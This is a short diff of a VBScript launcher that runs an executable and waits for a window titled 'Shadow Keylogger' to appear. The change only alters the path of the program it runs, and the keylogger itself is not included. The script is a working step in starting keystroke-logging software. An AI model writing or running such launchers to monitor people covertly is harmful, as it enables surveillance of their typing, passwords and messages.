@@ -1,5 +1,5 @@
 Set objShell = WScript.CreateObject("WScript.Shell")
-objShell.Run ".\App\sk.exe"
+objShell.Run "SK.exe"
 Do Until Success = True
     Success = objShell.AppActivate("Shadow Keylogger")
     Wscript.Sleep 1000
